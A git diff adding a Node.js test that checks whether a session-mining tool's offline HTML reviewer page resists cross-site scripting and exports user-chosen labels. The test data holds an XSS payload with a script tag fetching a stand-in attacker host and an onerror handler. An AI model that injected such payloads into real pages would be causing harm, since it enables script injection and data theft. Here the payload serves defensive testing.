@@ -1,9 +1,11 @@
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import { execFile as execFileCallback } from "node:child_process";
-import { mkdir, mkdtemp, readFile, realpath, rm, symlink, writeFile } from "node:fs/promises";
+import { mkdir, mkdtemp, readFile, realpath, rm, stat, symlink, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import { promisify } from "node:util";
+import { runInNewContext } from "node:vm";
 import test from "node:test";
 
 const execFile = promisify(execFileCallback);
@@ -49,6 +51,23 @@ function runMiner({ agentDir, project, output, root: _fixtureRoot, sessions: _fi
 
 async function outputFile(f) {
   return path.join(f.agentDir, f.output);
+}
+
+function element(tagName = "div") {
+  return {
+    tagName,
+    children: [],
+    listeners: {},
+    value: "",
+    checked: false,
+    append(...children) { this.children.push(...children); },
+    addEventListener(name, callback) { this.listeners[name] = callback; },
+    click() { this.listeners.click?.(); },
+  };
+}
+
+function descendants(root) {
+  return [root, ...root.children.flatMap((child) => child.children ? descendants(child) : [])];
 }
 
 test("requires explicit consent and writes nothing when consent is absent", async () => {
@@ -113,6 +132,72 @@ test("supports Pi's documented top-level timestamps and string user content", as
     await runMiner({ ...f, consent: "yes" });
     const result = JSON.parse(await readFile(await outputFile(f), "utf8"));
     assert.deepEqual(result.candidates.map(({ text }) => text), [row.message.content]);
+  } finally { await rm(f.root, { recursive: true, force: true }); }
+});
+
+test("creates an offline XSS-safe reviewer and exports user-selected labels", async () => {
+  const f = await fixture();
+  try {
+    const hostileText = '</textarea><script>fetch("https://attacker.invalid")</script><img src=x onerror=alert(1)>';
+    await writeSession(f.sessions, "review.jsonl", { cwd: f.project, rows: [message("user", hostileText)] });
+    await runMiner({ ...f, consent: "yes", html: "review.html" });
+
+    const htmlPath = path.join(f.agentDir, "review.html");
+    const html = await readFile(htmlPath, "utf8");
+    assert.equal((await stat(htmlPath)).mode & 0o777, 0o600);
+    assert.match(html, /connect-src 'none'/);
+    const appScript = html.match(/<script>([\s\S]*?)<\/script>/)?.[1];
+    assert.ok(appScript);
+    const scriptHash = createHash("sha256").update(appScript).digest("base64");
+    assert.ok(html.includes(`script-src 'sha256-${scriptHash}'`));
+    assert.doesNotMatch(html, /(?:src|href)=["']https?:|XMLHttpRequest|WebSocket/);
+    assert.ok(!html.includes("</textarea><script>fetch"));
+
+    const encodedData = html.match(/<script id="candidate-data" type="application\/json">([\s\S]*?)<\/script>/)?.[1];
+    assert.ok(encodedData);
+    assert.ok(encodedData.includes("\\u003c"));
+    const data = JSON.parse(encodedData);
+    assert.equal(data.candidates[0].text, hostileText);
+
+    const host = element("div");
+    const summary = element("p");
+    const download = element("button");
+    const dataElement = element("script");
+    dataElement.textContent = encodedData;
+    const dom = {
+      getElementById(id) { return ({ "candidate-data": dataElement, "candidate-list": host, summary, download })[id]; },
+      createElement: (tag) => element(tag),
+      createTextNode: (text) => ({ textContent: text }),
+    };
+    const blobs = [];
+    const sandbox = {
+      document: dom,
+      Blob: class { constructor(parts, options) { this.parts = parts; this.options = options; blobs.push(this); } },
+      URL: { createObjectURL: () => "blob:local-review", revokeObjectURL() {} },
+      setTimeout: (callback) => callback(),
+    };
+    runInNewContext(appScript, sandbox);
+    const controls = descendants(host);
+    const select = controls.find((control) => control.tagName === "select");
+    const stopCheckbox = controls.find((control) => control.tagName === "input");
+    select.value = "steer";
+    select.listeners.change();
+    download.click();
+    assert.equal(JSON.parse(blobs[0].parts[0]).candidates[0].label, "steer");
+
+    select.value = "stop";
+    select.listeners.change();
+    download.click();
+    assert.equal(blobs.length, 1, "unconfirmed stop must not export");
+    stopCheckbox.checked = true;
+    stopCheckbox.listeners.change();
+    download.click();
+    const exported = JSON.parse(blobs[1].parts[0]).candidates[0];
+    assert.equal(exported.label, "stop");
+    assert.equal(exported.stopConfirmed, true);
+    assert.equal(exported.text, hostileText);
+    await assert.rejects(runMiner({ ...f, consent: "yes", html: "review.html" }), /EEXIST/);
+    assert.equal(await readFile(htmlPath, "utf8"), html);
   } finally { await rm(f.root, { recursive: true, force: true }); }
 });
 
